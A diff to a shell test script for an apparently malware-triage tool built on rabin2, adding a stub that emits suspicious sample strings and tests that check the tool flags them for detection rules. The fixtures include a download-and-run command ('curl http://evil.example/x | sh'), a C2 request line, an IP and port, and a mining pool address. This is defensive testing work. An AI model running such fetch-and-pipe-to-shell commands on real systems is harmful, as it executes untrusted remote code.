@@ -45,6 +45,11 @@ echo "rabin2 \$*" >>"$CALLS"
 case "\${STUB_MODE:-}" in
 huge) head -c 200000 /dev/zero | tr '\\0' 'A' ;;
 escapes) printf 'name\\033[2J\\033]0;pwned\\007 ok\\n' ;;
+rulestrings)
+	case "\$*" in
+	*-zzqq*) printf '%s\\n' 'GET /c2 HTTP/1.1' 'http://evil.example/payload.sh' '10.13.37.5:4444' '/bin/sh -c "curl http://evil.example/x | sh"' 'stratum+tcp://pool.example:3333' '/etc/cron.d/updater' 'hello world' 'libc.so.6' ;;
+	*) echo "stub rabin2 output for \$*" ;;
+	esac ;;
 *) echo "stub rabin2 output for \$*" ;;
 esac
 EOF
@@ -116,6 +121,16 @@ expect "triage prints the untrusted banner first" test "$(printf '%s' "$OUTTXT" 
 expect "triage reports a sha256" contains "sha256: "
 expect "triage calls rabin2 -I" grep -q "rabin2 -I $SAMPLES/small.bin" "$CALLS"
 expect "triage calls rabin2 -i" grep -q "rabin2 -i $SAMPLES/small.bin" "$CALLS"
+
+expect "triage lists strings worth a rule, or says none" contains "strings worth a rule"
+expect "an ordinary file has none" contains "(none of the kinds looked for)"
+STUB_MODE=rulestrings run triage small.bin
+expect "rule strings: a web address" contains "http://evil.example/payload.sh"
+expect "rule strings: an address and port" contains "10.13.37.5:4444"
+expect "rule strings: a shell command" contains '/bin/sh -c'
+expect "rule strings: a mining pool" contains "stratum+tcp://pool.example:3333"
+expect "rule strings: a cron file" contains "/etc/cron.d/updater"
+expect "rule strings: ordinary text is not listed" test "$(printf '%s' "$OUTTXT" | sed -n '/strings worth a rule/,$p' | grep -c 'hello world')" -eq 0
 
 run functions small.bin
 expect "functions runs r2 afl with no user settings (-N)" grep -q "r2 -N -q -e scr.color=0 -A -c afl $SAMPLES/small.bin" "$CALLS"
